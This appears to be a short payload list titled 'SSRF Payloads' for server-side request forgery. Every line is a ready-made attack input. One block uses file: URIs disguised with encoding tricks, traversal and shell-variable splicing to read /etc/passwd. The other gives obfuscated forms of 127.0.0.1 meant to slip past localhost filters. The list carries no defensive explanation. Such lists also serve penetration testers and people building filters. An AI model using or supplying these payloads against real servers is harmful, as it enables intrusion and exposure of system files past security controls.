
<h1 align="center">SSRF Payloads</h1>

<h3>file:</h3>
## /etc/passwd

<pre><code>
file:/etc/passwd?/
file:/etc/passwd%3F/
file:/etc%252Fpasswd/
file:/etc%252Fpasswd%3F/
file:///etc/?/../passwd
file:///etc/%3F/../passwd
file:${br}/et${u}c/pas${te}swd?/
file:$(br)/et$(u)c/pas$(te)swd?/
file:${br}/et${u}c%252Fpas${te}swd?/
file:$(br)/et$(u)c%252Fpas$(te)swd?/
file:${br}/et${u}c%252Fpas${te}swd%3F/
file:$(br)/et$(u)c%252Fpas$(te)swd%3F/
file:///etc/passwd?/../passwd
</code></pre>

<h3>URL HTTP payload</h3>
<pre><code>

http://127.0.0.1
http://127.1
http://0177.0.0.01
http://0x7f.0x0.0x0.0x1
http://0x7f000001
http://0xa54e55584d7f000001
http://281472812449793
http://111111111111111101111111000000000000000000000001
http://0x7f.0.0.0x1
http://::ffff:7f00:0001
http://%31%32%37%2E%30%2E%30%2E%31
http://127.000.000.001

</code></pre>
